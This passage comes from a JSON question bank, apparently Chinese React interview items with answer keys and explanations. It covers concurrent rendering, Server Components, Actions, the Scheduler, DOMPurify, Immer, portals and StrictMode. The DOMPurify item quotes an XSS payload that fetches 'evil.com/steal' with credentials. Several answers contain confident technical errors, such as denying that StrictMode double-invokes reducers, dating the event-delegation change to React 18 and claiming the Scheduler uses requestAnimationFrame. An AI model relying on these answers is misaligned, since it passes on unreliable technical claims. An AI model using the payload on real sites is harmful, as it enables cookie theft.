subscription。2）Zustand：Zustand v4 使用 useSyncExternalStore 实现选择器。3）浏览器 API 订阅：navigator.onLine、document.title、localStorage、window.innerWidth。4）集成第三方状态管理库（MobX、Valtio）。Polyfill——对于不支持并发模式的 React 版本（< 18），use-sync-external-store shim 提供了向下兼容。","hints":["为什么 React 18 并发模式下需要 useSyncExternalStore——防止 tearing（数据撕裂）","Redux 和 Zustand 在 React 18 中如何利用 useSyncExternalStore 实现状态订阅"],"tags":["React","Hooks","并发","外部状态","React 18"],"id":3516},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Server Components 数据获取模式与流式渲染","content":"React Server Components（RSC）的数据获取模式与传统的 SSR + Client Hydration 有何本质区别？RSC Payload 的序列化协议如何处理 props 中的函数和组件引用？流式渲染（Streaming）如何与 Suspense 配合提升用户体验？","answer":"答案：RSC 的数据获取在服务端组件中直接进行（可同步读取数据库/文件系统），无需构建 API 层。RSC 的输出是一种特殊序列化数据（RSC Payload），描述组件树的结构和 props，而不是 HTML 字符串。函数类型的 props 会被序列化为特殊引用（客户端通过 import 恢复），但闭包和内部状态不序列化。\n\n解析：RSC 与传统 SSR 的本质区别——1）SSR：服务端渲染 HTML → 客户端加载全部 JS → 水合（Hydrate）激活交互。即使纯静态组件也需要在客户端加载 JS。2）RSC：服务端运行组件 → 输出序列化组件树（RSC Payload）→ 客户端接收并渲染。服务端组件的 JS 完全不在客户端 bundle 中。RSC 与 SSR 可结合使用——RSC 产出组件树，SSR 将其渲染为 HTML 用于首屏。\n\nRSC Payload 序列化——1）基本类型（string、number、boolean、null）正常序列化。2）React Element 序列化为 { $$typeof: Symbol.for('react.element'), type: reference_id, props: {...} }。3）客户端组件的引用通过 import reference 传递（客户端运行时根据 manifest 加载实际组件）。4）函数类型的 props 不支持直接序列化——RSC 不允许传递函数作为 props 给服务器组件。5）Promise 可以被序列化（配合 Suspense 实现流式输出）。\n\n扩展延伸：流式渲染——每个 Suspense 边界独立流式传输。当服务端遇到 await 时，先发送已准备好的部分，插入占位符。客户端根据占位符显示 Suspense fallback。数据就绪后，服务端流式发送该部分的 RSC Payload，客户端无缝替换 fallback 为实际内容。用户体验改善——无需等待整个页面全部完成才显示，用户看到的是「逐步解锁」的页面。Next.js App Router 的 loading.js 对应 Suspense 边界，error.js 对应 Error Boundary。RSC 的局限性——不支持状态和交互逻辑（useState、onClick 等），只能用于数据获取和纯渲染。这些需要在 'use client' 客户端组件中实现。","hints":["RSC 与 SSR 的核心区别——RSC 输出序列化组件树（零客户端 JS），SSR 输出 HTML（仍需 Hydrate）","RSC 的流式渲染如何实现——每个 Suspense 边界独立流式传输 RSC Payload"],"tags":["React","Server Components","RSC","流式渲染","SSR"],"id":3517},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 并发渲染与 Transition 深度对比","content":"请对比 React 18 的 useTransition 与常规 setState 的渲染行为差异。useDeferredValue 和 useTransition 在实现原理和使用场景上有何不同？并发模式下 startTransition 中的更新一定会被延迟吗？","answer":"答案：useTransition 标记低优先级更新，告诉 React 该更新可以被更高优先级的更新打断。常规 setState 是紧急更新（如用户输入），startTransition 内的更新是非紧急的（如基于输入过滤列表）。useDeferredValue 与 useTransition 本质相同（延迟值应用），但 useTransition 包装的是状态更新函数，useDeferredValue 包装的是值本身。\n\n解析：useTransition——const [isPending, startTransition] = useTransition()。isPending 表示是否有未完成的 transition。startTransition(() => { setSearchQuery(input) }) 内的 setState 被标记为 Transition 优先级。如果用户在 transition 完成前再次输入，React 会中断上一次的 transition 渲染，优先处理输入更新。效果：输入框不卡顿，列表更新可等待。useDeferredValue——const deferredQuery = useDeferredValue(input)。input 是紧急值立即更新到 UI（如输入框），deferredQuery 是延迟值（如过滤列表的输入条件）。实现原理：useDeferredValue 内部调用 useTransition + useEffect，将 deferred 值的变化包装在 transition 中。\n\n扩展延伸：startTransition 一定会延迟吗？不一定——1）如果 CPU 足够快，transition 在下一帧内完成，用户感知不到延迟。2）如果当前没有更高优先级更新，transition 立即执行（只是优先级较低，但不一定延迟）。3）React 的并发模式是「可中断」而非「延迟执行」——thread 的区别很重要。useTransition vs debounce/throttle——1）debounce 固定等待时间（无论 CPU 是否空闲），useTransition 不等待，它只是让出优先级给高优先级更新。2）debounce 可能导致明显延迟（如 300ms），useTransition 在 CPU 空闲时几乎无延迟。3）debounce 是定时器实现（即使没有高优先级更新也要等），useTransition 是调度器实现（空闲立刻执行）。所以 useTransition 比 debounce 更适合「保持响应式」的场景。\n\n注意：useTransition 只在并发模式（Concurrent Mode）下生效。React 18 默认开启自动批量更新但不开启并发模式——需要 createRoot 并使用 Suspense/startTransition 才能真正获得并发渲染能力。","hints":["useTransition 和 debounce 的本质区别——useTransition 是可中断调度，debounce 是固定延迟","useDeferredValue 如何利用 useTransition 实现值的延迟更新"],"tags":["React","并发","useTransition","useDeferredValue","React 18"],"id":3518},{"category":"react","difficulty":"hard","type":"choice","title":"React 19 Actions 与表单处理边界","content":"关于 React 19 引入的 Actions 和表单相关 Hooks，以下说法正确的是：","options":["A) useActionState 的返回值中，状态（state）在每次 action 执行后都会重置为初始值","B) useFormStatus 可以在任意组件中读取最近的父级 <form> 的提交状态，无论组件层级多深","C) <form action={asyncFunction}> 中的异步函数在客户端执行时，React 会自动管理 pending 状态和表单重置","D) useOptimistic 的更新是瞬时生效的，无论后端请求最终成功还是失败，乐观状态都会保留在 UI 上"],"answer":"C) <form action={asyncFunction}> 中的异步函数在客户端执行时，React 会自动管理 pending 状态和表单重置\n\n解析：React 19 的 Actions 机制中，通过 form action 属性使用异步函数时，React 自动：1）管理提交期间的 pending 状态（可通过 useFormStatus 读取）。2）提交完成后自动重置表单（不需要手动调用 reset()）。3）将提交错误信息通过 useActionState 的 error 状态暴露。说法 A 错误——useActionState 的 state 在 action 执行后不重置，而是接收 action 的返回值作为新状态。说法 B 错误——useFormStatus 只能在 <form> 组件的子组件（直接或间接嵌套）中使用，不能在任何组件中读取任意 form 的状态。说法 D 错误——useOptimistic 的更新是乐观的（立即显示预期结果），但如果后端请求失败，React 会自动回滚到实际状态。\n\n扩展延伸：React 19 Actions 的设计思路——将表单处理从「手动管理状态」变为「声明式异步处理」。传统模式：useState + onChange + onSubmit + 手动管理 loading/error。Actions 模式：action 函数 + useActionState + useFormStatus + useOptimistic。Server Actions——当 action 函数标记为 'use server' 时，它在服务端执行，客户端通过 fetch 调用（RPC 风格），无需手动写 API 路由和 fetch 调用。<form action={serverAction}> 直接在后端处理表单提交。useActionState——const [state, formAction, isPending] = useActionState(actionFn, initialState)。actionFn 接收 prevState 和 formData，返回新状态。适用于：表单提交后显示服务器返回的消息（如「保存成功」或「校验失败」）。useOptimistic——const [optState, addOptimistic] = useOptimistic(actualState, (state, action) => newState)。示例：列表中的点赞操作——点击后立即增加点赞数，后台请求失败后自动回滚。","hints":["useOptimistic 如何实现乐观更新并在失败时自动回滚","Server Actions 如何实现客户端调用服务端函数而无需手动写 API"],"tags":["React","React 19","Actions","表单","Server Actions"],"id":3519},{"category":"react","difficulty":"hard","type":"short_answer","title":"React createElement 与 JSX 编译产物的结构","content":"请解释 JSX 经过 Babel 或 TypeScript 编译后的产物结构。React.createElement(type, props, ...children) 的参数分别对应什么？React 17+ 的 JSX Transform（runtime automatic）与传统 JSX Transform（runtime classic）有什么不同？","answer":"答案：JSX <div className=\"app\"><Child name=\"test\" /></div> 在 classic runtime 下编译为 React.createElement('div', { className: 'app' }, React.createElement(Child, { name: 'test' }))。在 automatic runtime（React 17+）下编译为 import { jsx as _jsx } from 'react/jsx-runtime' 和 _jsx('div', { className: 'app', children: _jsx(Child, { name: 'test' }) })。createElement(type, config, ...children) 中：type 是元素类型（字符串 'div' 或组件），config 是 props 对象（含 key 和 ref），后续参数是子元素。\n\n解析：createElement 的核心逻辑——1）处理 config：从 config 中提取 key 和 ref（不放入 props），剩余属性作为 props。2）处理 children：超过 2 个额外参数以数组形式压入 props.children，单个参数直接赋值。3）defaultProps：如果 type 组件有 defaultProps，补充未提供的默认 prop 值。4）返回 ReactElement 对象：{ $$typeof: REACT_ELEMENT_TYPE, type, key, ref, props }。$$typeof = Symbol.for('react.element') 用于防止 XSS（JSON 中无法包含 Symbol）。\n\n扩展延伸：Automatic Runtime 的变化——1）不再需要 import React from 'react'，只需 import { useState } from 'react' 等 Hooks。2）使用 _jsx（静态元素，children 扁平化）和 _jsxs（动态元素，children 需要追踪）的优化——Babel 自动判断。3）_jsxDEV（开发模式，含额外的调试信息：文件名、行号、源映射）。4）Fiber 创建——createElement 的输出（ReactElement）不是 Fiber 节点，在 reconciliation 期间 React 会将 ReactElement 与已有 Fiber 节点进行 diff 并创建/复用 Fiber。性能影响——1）createElement 调用本身的开销可忽略。2）inline object 的 props（如 style={{ color: 'red' }}）每次 render 创建新引用，影响 React.memo 的浅比较。3）automatic runtime 略微减少函数调用层级。","hints":["$$typeof = Symbol.for('react.element') 的设计意图——为什么不用普通的对象 {}","automatic runtime 中的 _jsx 和 _jsxs 的优化差异——运行时如何判断是否需要追踪子元素"],"tags":["React","JSX","编译","原理"],"id":3520},{"category":"react","difficulty":"easy","type":"choice","title":"React 合成事件的池化机制与 event.persist() 的必要性","content":"在 React 17 之前，以下代码中点击按钮后 console.log(event.type) 的输出是什么？\n```jsx\nfunction handleClick(event) {\n  setTimeout(() => {\n    console.log(event.type);\n  }, 100);\n}\n```","options":["A) 点击后正常输出 \"click\"","B) 输出 \"click\" 但控制台有 DeprecationWarning","C) 输出 null 或抛出异常（因合成事件对象已被回收）","D) 代码不执行，因为 setTimeout 中不能访问 event"],"answer":"C) 输出 null 或抛出异常（因合成事件对象已被回收）。\n\n解析：在 React 17 之前，React 使用事件池（Event Pooling）机制——合成事件对象（SyntheticEvent）在处理函数执行完后被重置（所有属性置为 null）并放回对象池复用。因此异步访问 event 属性时（如 setTimeout、Promise.then、requestAnimationFrame），event 已被清除，event.type 为 null。解决方案是在事件处理函数中调用 event.persist()，从池中移除该事件对象，使其属性保持可用。React 17 移除了事件池，不再需要 event.persist()。\n\n扩展延伸：为什么 React 17 移除事件池——1）现代浏览器性能已足够好，创建少量事件对象的 GC 开销可忽略。2）事件池强制了每次事件属性都必须是可重置的，限制了 React 对新浏览器 API 的支持（如 Pointer Events）。3）事件池导致异步访问事件时需要手动 persist()，是一个常见的混淆点。4）React 18 的事件委托从 document 移到 root 节点后，池化机制更没必要。\n\n注意事项——1）React 17+ 中 event.persist() 仍然存在（空操作，向后兼容）。2）e.nativeEvent（原生事件对象）不会被池化，始终可用。3）如果需要在同步事件处理中多次读取同一个事件属性，池化机制会影响性能（每次属性访问都通过 getter 获取——但这是微优化层面的影响）。4）React 18 中事件对象在回调执行完后属性不会被清空，但也不建议在异步回调中依赖事件对象（耦合渲染生命周期和异步逻辑是反模式）。推荐做法：在事件处理函数中提取需要的值存为局部变量，再在异步回调中使用局部变量。","hints":["React 17 移除事件池的根本原因——现代浏览器的 GC 性能以及 Pointer Events 兼容性","为什么不推荐在异步回调（setTimeout/Promise）中直接使用合成事件对象"],"tags":["React","合成事件","事件池","React 17"],"id":3521},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Concurrent Mode 的时间切片机制与 yield 策略","content":"请解释 React Concurrent Mode（并发模式）中时间切片（Time Slicing）的实现原理。React 如何在不阻塞主线程的情况下分片执行渲染工作？scheduler 模块如何与浏览器的帧周期协作？","answer":"答案：React 的 Scheduler 模块实现了协作式的时间切片——将渲染工作拆分为多个 5ms 的小任务单元，每执行完一个单元就 yield 回主线程检查是否有更高优先级的更新（如用户输入）。Scheduler 使用 MessageChannel + requestAnimationFrame 实现帧同步，而非 requestIdleCallback（因为 Safari 不支持且 rIC 的触发不够可靠）。时间切片的核心是「在当前帧的剩余时间内尽可能多工作，用完了就暂停，下一帧继续」。\n\n解析：时间切片的实现——1）Scheduler 维护两个队列：taskQueue（到期任务，按过期时间排序）和 timerQueue（未到期任务）。2）workLoop 是核心循环：在每个 task 执行时记录 startTime，每执行一个 fiber 单元后检查 performance.now() - startTime 是否超过 yieldInterval（默认 5ms）。3）如果超过，调用  scheduler.scheduleCallback 将剩余任务放入 MessageChannel 的回调中，等待浏览器下一帧空闲继续执行。4）利用 MessageChannel 的 postMessage 宏任务特性，在浏览器完成渲染和事件处理后执行回调。优先级级别——Scheduler 定义了 5 种优先级：Immediate（同步执行，如键盘输入）、UserBlocking（250ms 超时，如点击）、Normal（5s 超时，如数据请求）、Low（10s 超时，如分析日志）、Idle（永不超时，如预渲染）。\n\n扩展延伸：帧周期协作——1）理想的一帧 16.6ms 中：React 的 Scheduler 可能占用 5-10ms 执行 Fiber 构建，然后 yield 给浏览器渲染（Style/Layout/Paint）。2）如果用户有输入事件，浏览器在 MessageChannel 回调前优先处理输入。3）React 的 Scheduler 不硬编码 16.6ms 限制——在低刷新率屏幕（30fps）或高负载下自动调整。\n\n与 requestIdleCallback 的区别——1）rIC 在帧末尾执行且 timeRemaining 上限 50ms（过长切片）。2）React Scheduler 的 5ms 切片粒度更细，交互响应更及时。3）rIC 在 Safari 不支持。4）MessageChannel 的回调执行在微任务之后、rAF 之前——这个时机更适合做渲染准备工作。实际效果——在大量数据更新（如 10000 个列表项）时，传统 React 同步渲染可能阻塞主线程 200ms+ 导致掉帧，Concurrent Mode 将渲染分割到多个帧中，每帧只渲染一部分，保持 60fps 的交互响应。Concurrent Mode 是未来 React 的基础架构能力。","hints":["为什么 React 选择 MessageChannel 而非 requestIdleCallback 实现时间切片——Safari 兼容性和切片粒度","Scheduler 的 5ms yield 阈值如何影响渲染和输入响应——太大会阻塞帧，太小导致频繁切换"],"tags":["React","Concurrent Mode","时间切片","调度"],"id":3522},{"category":"react","difficulty":"hard","type":"short_answer","title":"React dangerouslySetInnerHTML 的安全风险与 DOMPurify 消毒","content":"React 中 dangerouslySetInnerHTML 为什么是危险的？在必须使用 innerHTML 的场景下（如富文本编辑器、Markdown 渲染），如何安全地消毒（Sanitize）HTML？DOMPurify 的消毒原理和配置策略是什么？","answer":"答案：dangerouslySetInnerHTML 是 React 绕过默认的 XSS 防护（JSX 的 HTML entity 自动转义）的逃逸口。传入的 HTML 字符串直接通过 innerHTML 设置到 DOM 中，如果字符串包含恶意脚本标签或事件处理器，会导致 XSS 攻击。安全使用它必须在设置前对 HTML 进行消毒——DOMPurify 是业界标准方案。DOMPurify 在浏览器端解析 HTML 字符串为 DOM 树，然后遍历节点树，仅保留白名单中的标签和属性，移除所有可执行脚本（<script>、on* 事件属性、javascript: URL 协议等）。\n\n解析：为什么 dangerouslySetInnerHTML 不是 escape hatcher——React 的 JSX 默认对嵌入值做 HTML entity 转义（{userInput} 中的 < 变为 &lt;），但 dangerouslySetInnerHTML={{ __html: htmlString }} 完全绕过这个保护——htmlString 原样插入 DOM。如果 htmlString 来自用户输入，攻击者可以在其中注入 <script>fetch('https://evil.com/steal', {credentials: 'include'})</script>。\n\nDOMPurify 的消毒策略——1）白名单机制：DOMPurify 维护允许的标签白名单（如 div、p、b、i、a、img 等安全标签）和允许的属性白名单（如 href、src、class、style 等安全属性，排除 onclick、onload 等事件处理器）。2）3）配置选项：ADD_TAGS（额外允许的标签）、ADD_ATTR（额外允许的属性）、ALLOWED_URI_REGEXP（控制 href/src 允许的 URI 协议，默认允许 http/https/ftp/mailto，排除 javascript:）。WHOLE_DOCUMENT（是否允许 <html>/<head>/<body> 标签）。4）返回值：消毒后的 clean HTML 字符串，可直接用于 dangerouslySetInnerHTML。\n\n扩展延伸：最佳实践——1）DOMPurify 应在客户端和服务器端都做消毒（双层防护）。2）不要依赖正则表达式消毒 HTML（stackoverflow 上那些 100 行的正则 sanitizer 几乎都被绕过过）。3）配合 Content Security Policy（CSP）做到纵深防御——即使 DOMPurify 被绕过，script-src 限制仍可以阻止恶意脚本执行。4）DOMPurify 2.0+ 适配了 SVG 和 MathML 的消毒，并采用了 namespace-aware 的处理。5）在 Next.js/Gatsby 等 SSR 框架中，DOMPurify 可用于服务端（JSDOM）和客户端（浏览器原生 DOM），保持一致性。\n\n注意：即使使用 DOMPurify，也不建议用 dangerouslySetInnerHTML 渲染用户生成的富文本内容。更安全的替代方案——使用 ProseMirror、Slate、TipTap 等结构化编辑器，将内容存储为 JSON（而非 HTML 字符串），渲染时由框架控制输出。","hints":["为什么正则表达式无法可靠地消毒 HTML——HTML 解析器的 Tag 处理和属性解析远比正则表达式复杂","DOMPurify 在服务器端（Node.js）为何需要 JSDOM——DOMPurify 依赖浏览器 DOM API"],"tags":["React","安全","XSS","DOMPurify"],"id":3523},{"category":"react","difficulty":"medium","type":"choice","title":"React 中状态不可变更新原则与 Immer 的 Proxy 实现","content":"以下关于 React 中状态不可变更新与 Immer 库的说法，正确的是？","options":["A) Immer 通过 Object.defineProperty 劫持状态对象的属性访问，自动追踪修改操作并生成新的不可变对象","B) 在 Immer 的 produce() 回调中直接修改 draft 对象的属性（如 draft.items.push(newItem)）会被 Proxy 捕获并记录变更，最终生成更新后的不可变副本","C) Immer 的 produce() 和 produce() 回调中 return 语句生成的不可变对象完全相同","D) Immer 只支持浅层（shallow）的不可变更新，嵌套对象修改需要手动返回新对象"],"answer":"B) 在 Immer 的 produce() 回调中直接修改 draft 对象的属性（如 draft.items.push(newItem)）会被 Proxy 捕获并记录变更，最终生成更新后的不可变副本。\n\n解析：Immer 使用 Proxy（而非 Object.defineProperty）代理 draft 对象——当我们对 draft 进行操作时（属性赋值、push、splice、sort 等），Proxy 拦截这些操作并记录变更到内部的 patches 集合中。produce 执行完毕后，Immer 基于这些 patches 从原始 state 生成一个修改后的不可变副本（未修改的属性共享原引用——结构共享 Structural Sharing）。A 选项错误：Immer 使用 Proxy，不是 Object.defineProperty（Vue 2 才用 defineProperty）。C 选项错误：produce 回调中 return 新对象与直接修改 draft 的行为不同——如果 return 了新对象，produce 直接返回这个新对象（不基于 draft）。D 选项错误：Immer 天然支持深层嵌套（全面 Proxy 代理，任意深度的属性访问都被拦截）。\n\n扩展延伸：Immer 的原理——\n```js\nimport { produce } from 'immer';\n\nconst baseState = [\n  { title: 'Learn React', done: true },\n  { title: 'Learn Immer', done: false },\n];\n\nconst nextState = produce(baseState, (draft) => {\n  draft[1].done = true;\n  draft.push({ title: 'Learn Proxy', done: false });\n});\n// baseState[0] === nextState[0]（未修改，引用共享）\n// baseState[1] !== nextState[1]（修改了，新对象）\n```\n\n结构共享（Structural Sharing）——1）在 draft 上修改的属性路径上的所有节点创建新副本。2）未修改的子树与 baseState 共享引用（节省内存和比较成本）。3）修改前后引用差异最小的对象可以做浅比较优化（React.memo、useSelector 等）。\n\n在 React 中使用 Immer——1）配合 useState：const [state, setState] = useState(initial); setState(produce(draft => { draft.value++ }))。2）配合 useReducer：const reducer = produce((draft, action) => { switch(action.type) { case 'add': draft.items.push(action.item) } })。3）React 18 和 React 19 中 Immer 的 Proxy 与 Concurrent Mode 兼容（Immer 的 freeze 机制在开发模式下冻结生成的 state，防止不小心修改）。性能评估——Immer 的 Proxy 有约 30-50% 的开销 vs 手写不可变更新，但在大多数业务场景下可忽略。在极高频更新（如 canvas 动画帧）中，建议手写不可变更新或使用 mutable 更新 + 手动克隆。","hints":["Immer 的 Proxy 代理的粒度——是浅层代理还是深层递归代理","结构共享（Structural Sharing）在 useMemo 和 React.memo 中的优化效果"],"tags":["React","Immer","不可变更新","状态管理"],"id":3524},{"category":"react","difficulty":"medium","type":"short_answer","title":"React flushSync 的强制同步刷新与第三方库集成","content":"React 18+ 引入的 flushSync 函数的作用是什么？请详细解释：\n1) flushSync 如何突破 React 的自动批处理（Automatic Batching）机制强制执行同步 DOM 提交；\n2) flushSync 的典型使用场景（如第三方库 DOM 操作、DOM 测量、滚动位置同步）；\n3) flushSync 的参数和返回值——传入回调中多个 setState 的批处理行为；\n4) flushSync 对 React Concurrent Mode 的破坏性——为什么它被设计为「escape hatch」而非日常 API；\n5) 在 React 19 中 flushSync 的行为是否有变化？","answer":"答案：flushSync(callback) 强制 React 同步刷新回调中的状态更新，确保 DOM 在回调返回时已是最新状态。\n\n1) 破坏自动批处理：\n- React 18 默认启用自动批处理——setTimeout、Promise、原生事件处理器中的多次 setState 合并为一次重渲染。\n- flushSync 包裹后，回调内的 setState 立即提交，每次 flushSync 调用触发独立的同步渲染周期。\n- 注意：flushSync 嵌套调用时，内部 flushSync 完成后外部才继续。\n\n2) 典型使用场景：\n- 第三方 DOM 库集成（如 D3、Chart.js、Leaflet）：需要 DOM 节点在库初始化时已渲染。\n- DOM 测量：getBoundingClientRect() 前需确保布局已完成。\n- 滚动位置同步：列表插入元素后需立即滚动到特定位置。\n- 输入法/IME 组合状态同步。\n\n3) 参数与批处理：\nflushSync(() => {\n  setA(1);\n  setB(2);  // 这两个 setState 会在一次同步提交中合并\n});\nflushSync(() => {\n  setC(3);  // 独立的同步提交，会导致两次渲染\n});\n多次 flushSync 会产生多个独立的渲染周期（不可合并），性能开销大。\n\n4) 对 Concurrent Mode 的破坏：\n- flushSync 强制中断 concurrent 渲染，使优先级抢占、时间切片等功能在此区间不可用。\n- 它绕过了 React 的调度器，直接将更新插入同步队列。\n- React 文档明确标识为 escape hatch，仅用于「必须同步」的互操作场景。\n- 滥用 flushSync 会消除 Concurrent Mode 的大部分性能优势。\n\n5) React 19 变化：\n- React 19 中 flushSync 的行为基本保持稳定。\n- 注意与 useSyncExternalStore 的分工：外部 store 的同步读取应使用 useSyncExternalStore，而非依赖 flushSync 的 side effect。\n- React 19 的 useActionState 内置了 flushSync 行为以支持表单提交的立即反馈。","hints":["flushSync 的名字已经说明了它的本质——先 flush（强制刷新），然后同步等待 DOM 提交完成。","如果在一个 Click Handler 中用三个独立的 flushSync 包裹三个 setState，会触发几次渲染？"],"tags":["React","批处理","Concurrent Mode","DOM","React 18"],"id":3525},{"category":"react","difficulty":"medium","type":"short_answer","title":"React createPortal 的 Context 继承机制","content":"关于 React createPortal 的以下叙述，哪个是正确的？\n\nA) Portal 渲染的内容在 DOM 结构上位于父组件之外，因此无法访问父组件的 Context 值\nB) Portal 的内容在 React 虚拟 DOM 树中仍然遵从父组件的 Context 链（即 Provider 的值对 Portal 子节点可见），但由于实际 DOM 位置在外，事件冒泡不遵循 React 树而是遵循 DOM 树\nC) createPortal 会将 Portal 内容附加到 document.body 节点，不允许自定义 container 参数\nD) Portal 中的事件会沿着 DOM 树冒泡到实际父节点，因此如果 Portal 在 document.body 下挂载，事件不会到达 React 父组件","answer":"答案：B) Portal 的内容在 React 虚拟 DOM 树中仍然遵从父组件的 Context 链（即 Provider 的值对 Portal 子节点可见），但由于实际 DOM 位置在外，事件冒泡不遵循 React 树而是遵循 DOM 树。\n\n解析：A 错误：Portal 的 React 树位置（即 createPortal 被调用的位置）决定了 Context 可见性——它仍能从祖先 Provider 获得值。这是 Portal 的核心设计：React 树（逻辑位置）与 DOM 树（渲染位置）解耦。\nB 正确：React 的 context 链基于 Fiber 树，与 DOM 位置无关；Portal 渲染在子 fiber 节点下，所以 context 传递正常。但事件冒泡遵循 DOM 树结构，因此无法从 Portal DOM 位置的祖先捕获事件（除非通过 Portal 自己的根节点）。\nC 错误：createPortal 的第二个参数是 container 节点，可以传入任意 DOM 元素，不限于 document.body。第三个参数是 key（可选）。\nD 错误：事件冒泡沿 DOM 树向上，不会「到达 React 父组件」（因为 React 父组件在 DOM 树的不同分支），但会到达 container 的 DOM 祖先。React 的合成事件系统在 Portal 容器节点的 DOM 树层捕获事件，而非 React 树层。\n\n应用场景：modal、tooltip、dropdown 等通常使用 Portal 避免 z-index/overflow 问题，且需要 context 保持可见。","hints":["Portal 有两棵树：React 树（控制 Context、props 传递）和 DOM 树（控制渲染位置、事件冒泡）。","Modal 组件中的 Context 是否可用？关键是 createPortal 在哪棵树的什么位置被调用。"],"tags":["React","Portal","Context","事件系统"],"id":3526},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Fragment 的 key 属性与编译优化行为","content":"React Fragment（<></> 或 <Fragment>）何时需要 key 属性？为何 Fragment 的 key 只能通过 <Fragment key={...}>（显式导入）形式传递而不能通过简写语法 <></>？在 React 19 的 React Compiler（自动记忆化）背景下，Fragment 的编译优化有何变化？在大型列表渲染中，使用 Fragment 包装多个元素而不添加额外 DOM 节点的做法对渲染性能有何具体影响？","answer":"答案：React Fragment 在不引入额外 DOM 节点的情况下聚合多个子元素。\n\n1) key 的需求时机：\n- Fragment 仅在使用 map() 渲染列表时需要 key——当 Fragment 作为数组的直接元素且需要 React 协调（reconciliation）追踪时。\n- 例如：items.map(item => <Fragment key={item.id}><h2>{item.title}</h2><p>{item.desc}</p></Fragment>)。\n- 单次（非循环）使用 Fragment 不需要 key，也不建议添加。\n\n2) 简写语法 <></> 不能传递 key：\n- <></> 是 JSX 编译器的语法糖，编译为 React.createElement(React.Fragment, null, children)。\n- 因为是语法糖，不支持传递属性（包括 key）。\n- 需要使用 key 时必须显式写 <Fragment key={...}> 或 React.createElement(React.Fragment, { key })。\n- 这是 JSX 规范的限制——<> 不解析属性对象。\n\n3) React 19 + React Compiler 的影响：\n- React Compiler 自动记忆化能识别 Fragment 结构，在重新渲染时复用子节点 VNode。\n- Compiler 会对 Fragment 直接输出的多个子元素应用「数组键化」优化，减少协调开销。\n- 在编译阶段，Compiler 可消除不必要的 Fragment 包装（空 Fragment 优化）。\n\n4) 列表渲染中的性能影响：\n- 优点：避免添加多余的 DOM 包裹元素（如 div），减少 DOM 树深度和样式计算开销。\n- 缺点：Fragment 不返回单一 DOM 节点，在某些 CSS 选择器（:first-child/:last-child）和 transition 动画中可能产生意外行为。\n- 在大型列表（1000 行以上）中，减少 DOM 层级对 Layout 和 Paint 阶段的性能有可测量的正向影响。\n- map() + Fragment 比 map() + div 的 HTML 输出更扁平，浏览器 Layout 树更浅，reflow 开销更小。","hints":["<></> 是语法糖——它编译后不创建属性对象，因此无法传递 key。","为什么 <div key={id}> 可以而 <>key 无法同时存在？因为 <> 没有属性插槽。"],"tags":["React","JSX","性能优化","React Compiler"],"id":3527},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 严格模式 (StrictMode) 双重调用策略与副作用检测","content":"关于 React StrictMode 在开发模式下的双重调用（Double Invocation）行为，以下哪一项是错的？\n\nA) StrictMode 会故意双重调用 reducer（useReducer 的 reducer 函数），以帮助开发者发现 reducer 中的不纯操作\nB) StrictMode 双重调用会执行 useEffect 的 cleanup 函数后重新运行该 useEffect，以验证 effect cleanup 是否正确\nC) StrictMode 的双重调用仅在开发模式下生效，生产构建不会影响实际执行逻辑\nD) StrictMode 会对 useState 的初始值函数（initializer function）进行双重调用来检查初始化逻辑的纯度","answer":"答案：A) 这是错误的。\n\n解析：A 错误：StrictMode 不会双重调用 useReducer 的 reducer 函数。StrictMode 会双重调用的是组件函数体本身（即 render 函数）、useState 的 initializer 函数、useMemo/useCallback 的回调。reducer 在双重渲染过程中也会被执行两次，但这只是双重渲染的自然结果，而非 StrictMode 的显式检查目标。\nB 正确：每个 useEffect 在 StrictMode 中执行「挂载 → 卸载 → 挂载」流程：运行 effect → cleanup → 再次运行 effect。这是为了确保 cleanup 被正确实现。\nC 正确：StrictMode 的双重调用仅发生在 development 构建（process.env.NODE_ENV === 'development'）。production 构建中 StrictMode 不做双重调用。\nD 正确：useState 的 initializer 函数（如 useState(() => computeExpensive())）在 StrictMode 下会被调用两次，虽然是惰性初始化但 StrictMode 依然会调用两次以检查纯度。\n\n补充：React 19 中 StrictMode 的行为更加细致——双重调用会记录并比较两次渲染的结果树来检测不纯度。遇到双重渲染导致的弹窗/通知重复问题，说明副作用未放在 useEffect 中。","hints":["注意题目问的是「哪一项是错的」。","StrictMode 的核心机制是 double-render + double-effect，但 reducer 本身不是被刻意「双重调用」来检查的。"],"tags":["React","Strict Mode","调试","副作用","React 19"],"id":3528},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 自定义渲染器 (react-reconciler) 架构","content":"React 的自定义渲染器（react-reconciler / React Reconciler）允许将 React 的声明式编程模型渲染到任意宿主环境（非 DOM）。请详细说明：\n1) react-reconciler 包的核心职责和协调器（Reconciler）的架构分层——从 ReactElement 到 Fiber 树再到宿主更新的完整流程；\n2) 实现一个自定义渲染器时必须实现的宿主配置接口（HostConfig）的关键方法（如 createInstance、appendInitialChild、commitUpdate、finalizeInitialChildren 等）；\n3) 常见的非 DOM 渲染器实例（如 React Native、React Three Fiber、Ink 终端渲染器）的宿主环境差异；\n4) 实现中的难点——如何处理事件系统、文本节点（TextComponent）和根节点挂载的约定（Container 的类型要求）。","answer":"答案：react-reconciler 是 React 体系的核心包，它将声明式描述（ReactElement）转化为宿主平台的实际渲染操作。\n\n1) 架构分层与流程：\n- Input 层：React.createElement / JSX 产生 ReactElement 结构。\n- Reconciler 层（react-reconciler）：ReactElement 被创建为 Fiber 节点，形成 Fiber 树。Fiber 节点携带工作优先级（lane）、副作用标记（flags）。Reconciler 执行 diff 算法（beginWork → completeWork）生成副作用列表（effect list）。\n- Renderer 层：HostConfig 接口——Reconciler 调用宿主配置的方法（如 createInstance）完成实际渲染。\n\n2) 核心 HostConfig 方法：\n- createInstance(type, props, rootContainerInstance, hostContext)：为给定类型创建宿主节点（如 DOM 的 createElement）。\n- createTextInstance(text, rootContainer, hostContext)：创建文本节点。\n- appendInitialChild(parentInstance, child)：初始挂载时添加子节点。\n- finalizeInitialChildren(instance, type, props, rootContainer)：初始化属性/事件绑定，返回是否需要在 commit 阶段更新。\n- prepareUpdate(instance, type, oldProps, newProps, rootContainer)：判断是否需要更新，返回更新 payload。\n- commitUpdate(instance, updatePayload, type, oldProps, newProps)：实际提交属性更新。\n- appendChild / insertBefore / removeChild：子节点管理。\n- clearContainer：清空容器（React 18 的新要求）。\n- supportsMutation：是否支持变动操作（true 为 DOM 模型，false 